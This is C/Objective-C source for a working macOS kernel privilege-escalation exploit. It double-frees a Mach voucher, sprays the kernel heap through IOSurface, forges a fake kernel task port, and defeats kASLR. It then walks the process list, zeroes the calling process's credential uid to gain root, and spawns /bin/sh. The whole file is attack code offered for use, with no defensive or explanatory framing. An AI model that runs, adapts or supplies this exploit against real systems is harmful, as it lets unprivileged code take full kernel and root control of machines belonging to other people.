#import <stddef.h>
#import <mach/mach.h>
#import <mach/mach_time.h>
#import <mach/mach_vm.h>
#import <IOKit/IOKitLib.h>
#import <IOKit/IOCFSerialize.h>
#import <CoreFoundation/CFPropertyList.h>
#import <pthread.h>
#import <CoreFoundation/CoreFoundation.h>
#import <sys/mman.h>
#import <IOSurface/IOSurface.h>
#import "exp.h"
#import <mach-o/loader.h>
kern_return_t _kret;
#define AMS(r,name) {_kret = r;if(_kret!=0) printf("[-] %s failed %s",name,mach_error_string(_kret)),fflush(stdout),sleep(3),exit(-1);}

const uint64_t IOSURFACE_CREATE_SURFACE = 0;
const uint64_t IOSURFACE_SET_VALUE = 9;
const uint64_t IOSURFACE_GET_VALUE = 10;
const uint64_t IOSURFACE_DELETE_VALUE = 11;


vm_size_t pageSize;

uint32_t transpose(uint32_t val){
	uint32_t ret = 0;
	for(size_t i = 0;val>0;i+=8){
		ret += (val%255)<<i;
		val/=255;
	}
	return ret + 0x01010101;
}

mach_port_t send_kalloc_message(void* message_body, uint32_t message_size)
{
	mach_port_t q;
	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
	mach_port_limits_t limits = {0};
	limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
	mach_port_set_attributes(mach_task_self(), q, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
	mach_msg_size_t msg_size = sizeof(struct simple_msg) + message_size;
	struct simple_msg* msg = malloc(msg_size);
	memset(msg,0,sizeof(struct simple_msg));
	memcpy(msg->buf,message_body,message_size);
	for(int i=0;i<256;i++){
		msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
		msg->hdr.msgh_size = msg_size;
		msg->hdr.msgh_remote_port = q;
		msg->hdr.msgh_local_port = MACH_PORT_NULL;
		msg->hdr.msgh_id = 0x41414141;
		AMS(mach_msg_send((mach_msg_header_t*)msg),"mach_msg_send");
	}
	return q;
}
uint32_t message_size_for_kalloc_size(uint32_t size){
	return ((size*3)/4)-0x74;
}

io_connect_t getClient(){
	mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
	if(service == MACH_PORT_NULL){
		printf("[-] Unable to get service\n");
		exit(-1);
	}
	io_connect_t conn = MACH_PORT_NULL;
	AMS(IOServiceOpen(service, mach_task_self(), 0, &conn),"IOServiceOpen");
	IOObjectRelease(service);
	return conn;
}
uint32_t createSurface(io_connect_t client){
	CFMutableDictionaryRef props_dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
		CFDictionarySetValue(props_dict, kIOSurfaceAllocSize, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &pageSize));
	CFDataRef props_data = IOCFSerialize(props_dict, kNilOptions);
		void* inputStruct = (void*)CFDataGetBytePtr(props_data);
		size_t inputStructCnt = (size_t)CFDataGetLength(props_data);

		char outputStruct[0x8D0];
		size_t outputStructCnt = 0x8D0;

		// create_surface
		int selector = 0;

		AMS(IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, inputStruct, inputStructCnt, outputStruct, &outputStructCnt),
			"create_surface");
	CFRelease(props_dict);
	CFRelease(props_data);
	uint32_t target_surface_id = *(uint32_t*)(&outputStruct[0x18]);
	return target_surface_id;
}

void send_port(mach_port_t dest, mach_port_t to_be_send){
	typedef struct {
		mach_msg_header_t	hdr;
		mach_msg_body_t		body;
		mach_msg_port_descriptor_t	port;
	} ool_msg;
	ool_msg msg;
	msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
	msg.hdr.msgh_size = sizeof(ool_msg);
	msg.hdr.msgh_remote_port = dest;
	msg.hdr.msgh_local_port = MACH_PORT_NULL;
	msg.hdr.msgh_id = 0x1337;
	
	msg.body.msgh_descriptor_count = 1;
	msg.port.name = to_be_send;
	msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
	msg.port.type = MACH_MSG_PORT_DESCRIPTOR;
	AMS(mach_msg(&msg.hdr, MACH_SEND_MSG|MACH_SEND_TIMEOUT, msg.hdr.msgh_size, 0, 0, 5, 0), "mach_msg");
}
void trigger_zone_gc(){
	uint32_t body_size = message_size_for_kalloc_size(16384)-sizeof(mach_msg_header_t);
	void* body = malloc(body_size);
	memset(body,'A',sizeof(body));
	mach_port_t ports[100] ={0};
	int port_mx = 0;
	int64_t avgTime = 0;
		for (int i = 0; i < 100; i++)
		{
			uint64_t t0;
			int64_t tdelta;
			
			t0 = mach_absolute_time();
			ports[i] = send_kalloc_message(body, body_size);
			tdelta = mach_absolute_time() - t0;
			
			/*
			 this won't necessarily get triggered on newer/faster devices (ie. >=A9)
			 this is mainly designed for older devices (in my case, A7) where spraying
			 such a large amount of data is a painful process
			 the idea here is to look for a longer spray which signals that GC may have
			 taken place
			 */
			if (avgTime && tdelta - avgTime > avgTime/2)
			{
				printf("[+] got gc at %d -- breaking\n", i);
				port_mx = i;
				break;
			}
			avgTime = ( avgTime * i + tdelta ) / (i + 1);
		}
	for(int i=0;i<=port_mx;i++) mach_port_deallocate(mach_task_self(), ports[i]);
	sched_yield();
	sleep(1);
	free(body);
}
void voucher_release(mach_port_t voucher){
	mach_port_t p2 = MACH_PORT_NULL;
	AMS(task_swap_mach_voucher(mach_task_self(), voucher,&p2),"task_swap_mach_voucher");
//	if(MACH_PORT_VALID(p2))
//	AMS(mach_port_deallocate(mach_task_self(), p2),"mach_port_deallocate");
}
mach_port_t tfp0;
//uint32_t kread32(uint64_t addr){
//	
//	uint32_t val = 0;
//	uint32_t sz = 0;
//	AMS(mach_vm_read_overwrite(tfp0, addr, 4, &val, &sz),"mach_vm_read_overwrite");
//	printf("[D] mach_vm_read_overwrite sz:%d\n",sz);
//	return val;
//}
uint64_t kread64(uint64_t addr){
	uint64_t val = 0x0;
	mach_vm_size_t sz = 8;
	AMS(mach_vm_read_overwrite(tfp0, addr, 8, &val, &sz),"mach_vm_read_overwrite");
	return val;
}
void kwrite32(uint64_t addr,uint32_t val){
	AMS(mach_vm_write(tfp0, addr, &val, 4),"mach_vm_write");
}
void kwrite64(uint64_t addr,uint64_t val){
	AMS(mach_vm_write(tfp0, addr, &val, 8),"mach_vm_write");
}
int main(int argc, char *argv[]) {
	mach_voucher_attr_recipe_data_t atm_data = {
		.key = MACH_VOUCHER_ATTR_KEY_ATM,
		.command = 510
	};
	io_connect_t client = MACH_PORT_NULL;
	AMS(host_page_size(mach_host_self(), &pageSize),"host_page_size");
	printf("[*] Host page size: %zu\n",pageSize);
	client = getClient();
	uint32_t surfaceid = createSurface(client);
	printf("[*] IOSurface client: %d\n",client);
	printf("[*] IOSurface ID %u\n",surfaceid);
	
	ipc_port_t* fakeport =(ipc_port_t*) mmap(0,0x8000,PROT_READ|PROT_WRITE,MAP_ANON|MAP_PRIVATE,-1,0);
	printf("[*] fakeport: %p\n",fakeport);
	mlock((void*)fakeport,0x8000);
	fakeport->ip_object.io_bits = IO_BITS_ACTIVE | IKOT_TASK;
	fakeport->ip_object.io_references = 100;
	fakeport->ip_messages.port.receiver_name = 1;
	fakeport->ip_messages.port.msgcount = 10;
	fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
	fakeport->ip_messages.port.waitq.waitq_type = WQT_QUEUE;
	fakeport->ip_messages.port.waitq.waitq_fifo = 1;
	fakeport->ip_messages.port.waitq.waitq_prepost = 0;
	fakeport->ip_messages.port.waitq.waitq_irq = 0;
	fakeport->ip_messages.port.waitq.waitq_isvalid = 1;
	fakeport->ip_messages.port.waitq.waitq_turnstile_or_port = 1;
	fakeport->ip_srights = 99;
	fakeport->ip_messages.port.waitq.waitq_queue.prev = 0x11;
	fakeport->ip_pdrequest = 0x11;
	fake_ipc_voucher_t fake_voucher = (fake_ipc_voucher_t){
		.iv_hash = 0x11111111,
		.iv_sum = 0x22222222,
		.iv_refs = 100,
		.iv_port = (uint64_t)fakeport,
	};
	int FILL_MEMSIZE = 0x4000000;
//	int FILL_MEMSIZE = 0x1443f000;
	int spray_qty = FILL_MEMSIZE / pageSize; // # of pages to spray
	
	int spray_size = (5 * sizeof(uint32_t)) + (spray_qty * ((4 * sizeof(uint32_t)) + pageSize));
	uint32_t *spray_data = calloc(spray_size,1); // header + (spray_qty * (item_header + pgsize))
	uint32_t* spray_cur = spray_data;
	*(spray_cur++) = surfaceid;
	*(spray_cur++) = 0x0;
	*(spray_cur++) = kOSSerializeMagic;
	*(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
	*(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_qty;
	for(int i = 0;i < spray_qty ;i++){
		*(spray_cur++) = kOSSerializeSymbol | 5;
		*(spray_cur++) = transpose(i);
		*(spray_cur++) = 0x0;
		*(spray_cur++) = (i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pageSize - 1);
		for(uintptr_t ptr = (uintptr_t) spray_cur, end = (uintptr_t)spray_cur+pageSize;
		ptr + sizeof(fake_ipc_voucher_t)<=end;
		ptr+=sizeof(fake_ipc_voucher_t)){
			bcopy((void*)&fake_voucher, (void*)ptr,sizeof(fake_ipc_voucher_t));
		}
		spray_cur += pageSize / sizeof(uint32_t);
	}
	printf("[+] Creating vouchers\n");
	mach_port_t pre_vouchers[0x2000],post_vouchers[0x1000];
	for(int i = 0;i<0x2000;i++)
	{AMS(host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &pre_vouchers[i]),"host_create_mach_voucher");
	}
	
	mach_port_t p1;
	AMS(host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1),"host_create_mach_voucher");
	for(int i = 0;i<0x1000;i++)
	{
	AMS(host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &post_vouchers[i]),"host_create_mach_voucher");
	}
	printf("[*] Stashing the target voucher\n");
	//Stash the voucher
	AMS(thread_set_mach_voucher(mach_thread_self(), p1),"thread_set_mach_voucher");
	printf("[*] Triggering the bug, Freeing the zone and reallocating\n");
	//Go go free the zone
	for(int i = 0;i<0x1000;i++)
	{
		AMS(mach_port_destroy(mach_task_self(), post_vouchers[i]),"mach_port_destroy");
	}
	//Trigger the bug
	voucher_release(p1);
	voucher_release(p1);
	for(int i = 0;i<0x2000;i++)
	{
		AMS(mach_port_destroy(mach_task_self(), pre_vouchers[i]),"mach_port_destroy");
	}
	trigger_zone_gc();
	uint32_t dummy=0;
	size_t sz = sizeof(dummy);
	AMS(IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, spray_data, spray_size, &dummy, &sz),"IOSURFACE_SET_VALUE");
	printf("[*] Recovering the voucher to our controlled port\n");
	mach_port_t theone;
	AMS(thread_get_mach_voucher(mach_thread_self(), 0, &theone),"thread_get_mach_voucher");
	if(!MACH_PORT_VALID(theone)){
		printf("[-] invalid voucher port %d\n",theone);
		exit(-1);
	}
	printf("[+] Recovered voucher %d!\n",theone);
	fflush(stdout);
	ktask_t *fake_task = (ktask_t*)calloc(0x600,1);
	fake_task->ref_count = 0xff;
	uint64_t* read_addr_ptr = (uint64_t*)((uint64_t)fake_task+OFFSET_BSDTASK);
	fakeport->kobject = (uint64_t)fake_task;
	#define rk32(addr,val){ \
		val = 0;\
		*read_addr_ptr = addr-OFFSET_PPID;\
		AMS(pid_for_task(theone,(int*)&val),"pid_for_task");\
	}
	
	#define rk64(addr,val){\
		int tu=0;\
		val=0;\
		rk32(addr+4,tu);\
		rk32(addr,val);\
		val |= ((uint64_t)tu<<32);\
	}
	puts("[*] Creating port to send");
	mach_port_t q = MACH_PORT_NULL;
	AMS(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q),"mach_port_allocate");
	printf("[*] Created port %d\n",q);
	puts("[*] Inserting port rights");
	AMS(mach_port_insert_right(mach_task_self(), theone, theone, MACH_MSG_TYPE_COPY_SEND),"mach_port_insert_right");
	AMS(mach_port_insert_right(mach_task_self(), q, q, MACH_MSG_TYPE_MAKE_SEND),"mach_port_insert_right");
	puts("[*] Sending q to The one");
	send_port(theone, q);
	puts("[+] Port sent");
	uint64_t ikmq_base = fakeport->ip_messages.port.messages;
	assert(ikmq_base);
	printf("[*] ikmq_base: %p\n",(void*)ikmq_base);
	uint64_t ikm_header = 0x0;
	rk64(ikmq_base + 0x18, ikm_header); /* ipc_kmsg->ikm_header */
	assert(ikm_header);
	printf("[*] ikm_header: %p\n",(void*)ikm_header);
	uint64_t port_addr = 0x0;
	rk64(ikm_header + 0x24, port_addr); /* 0x24 is mach_msg_header_t + body + offset of our port into mach_port_descriptor_t */ 
	assert(port_addr);
	printf("[*] port_addr: %p\n",(void*)port_addr);
	uint64_t itk_space =0x0;
	rk64(port_addr + __offsetof(ipc_port_t, receiver),itk_space);
	assert(itk_space);
	printf("[*] itk_space: %p\n",(void*)itk_space);
	uint64_t our_task = 0x0;
	rk64(itk_space+0x20,our_task);
	assert(our_task);
	printf("[*] our_task: %p\n",(void*)our_task);
	
	AMS(mach_ports_register(mach_task_self(), &client, 1),"mach_port_register");
	uint64_t client_port = 0x0;
	rk64(our_task+0x2e8,client_port);//task -> itk_registered
	assert(client_port);
	printf("[*] client_port: %p\n",(void*)client_port);
	
	uint64_t client_addr = 0x0;
	rk64(client_port+__offsetof(ipc_port_t, kobject),client_addr);
	assert(client_addr);
	printf("[*] client_addr: %p\n",(void*)client_addr);
	uint64_t client_vtab = 0x0;
	rk64(client_addr,client_vtab);
	assert(client_vtab);
	printf("[*] client_vtab: %p\n",(void*)client_vtab);
	uint64_t externalMethod = 0x0;
	rk64(client_vtab+0x860,externalMethod);
	assert(externalMethod);
	printf("[*] externalMethod: %p\n",(void*)externalMethod);
	uint64_t kernel_slide = externalMethod - 0xffffff8000a85680LL;
	printf("[+] Kernel Slide: %p\n",(void*)kernel_slide);
	uint64_t kernel_base = 0xFFFFFF8000200000LL+kernel_slide;
	uint32_t magic =0;
	rk32(kernel_base,magic);
	printf("[*] Magic header: %p\n",(void*)magic);
	assert(magic==MH_MAGIC_64);
	printf("[+] kASLR Defeated\n");
	printf("[*] Kernel base: %p\n",(void*)kernel_base);
	fflush(stdout);
	uint64_t our_proc = 0;
	rk64(our_task+0x380,our_proc);//task->bsd_info;
	assert(our_proc);
	printf("[*] our_proc: %p\n",(void*)our_proc);
	fflush(stdout);
	uint64_t kern_proc = 0;
	uint64_t current_proc = our_proc;
	while(!kern_proc){
		assert(current_proc);
		uint32_t ppid = 0;
		rk32(current_proc+0x60,ppid);//proc->p_pid;
		if(ppid==0){
			kern_proc = current_proc;
			break;
		}
		uint64_t p_list =0;
		rk64(current_proc,p_list);
		current_proc = p_list;
	}
	assert(kern_proc);
	printf("[*] Kernel proc: %p\n",(void*)kern_proc);
	uint64_t kern_task = 0x0;
	rk64(kern_proc+0x10,kern_task);//kern_proc->task
	assert(kern_task);
	printf("[*] Kernel task: %p\n",(void*)kern_task);
	uint64_t kern_map = 0x0;
	rk64(kern_task+0x20,kern_map);//task->map
	assert(kern_map);
	printf("[*] Kernel map: %p\n",(void*)kern_map);
	uint64_t kern_ipc_space = 0x0;
	rk64(client_port+__offsetof(ipc_port_t, receiver),kern_ipc_space);
	assert(kern_ipc_space);
	printf("[*] Kernel IPC Space: %p\n",(void*)kern_ipc_space);
	fflush(stdout);
//	fake_task->lock.data = 0x0;
//	fake_task->lock.type = 0x22;
//	rk64(kern_task,fake_task->lock.data);
//	rk64(kern_task+8,fake_task->lock.unk);
	fake_task->ref_count = 100;
	fake_task->active = 1;
	fake_task->map = kern_map;
	*(uint32_t *)((uint64_t)fake_task + 0xd8) = 1;//task->itk_self
	fakeport->receiver = kern_ipc_space;
	#undef rk32
	#undef rk64
	puts("[*] Testing fake tfp0");
	tfp0 = theone;
	uint64_t kbase_data = 0x0;
	kbase_data = kread64(kernel_base);
	printf("[*] Magic header from fake tfp0: %p\n",(void*)kbase_data);
	if((uint32_t)kbase_data == MH_MAGIC_64)
	printf("[+] Got fake kernel task port!\n");
	else
		{
			tfp0 = MACH_PORT_NULL;
			goto clean;
		}
	printf("[*] Current uid: %d\n",getuid());
	puts("[*] Elevating to r00t");
	uint64_t cred = 0;
	cred = kread64(our_proc+0xe0);//proc->p_ucred
	assert(cred);
	printf("[*] p_ucred: %p\n",(void*) cred);
	uint64_t p_cred = 0;
	p_cred = cred+0x18;
	assert(p_cred);
	printf("[*] posix_cred: %p\n",(void*) p_cred);
	kwrite32(p_cred+0x8,0);
	setuid(0);
	setuid(0);
	printf("[*] Current uid: %d\n",getuid());
	clean:
		fflush(stdout);
		sleep(3);
		puts("[*] Cleaning up");
		mach_port_deallocate(mach_task_self(), tfp0);
		mach_port_destroy(mach_task_self(), theone);
		mach_port_destroy(mach_task_self(), p1);
		IOObjectRelease(client);
		free(fake_task);
	if(getuid()==0)
	system("/bin/sh");
	return 0;
}
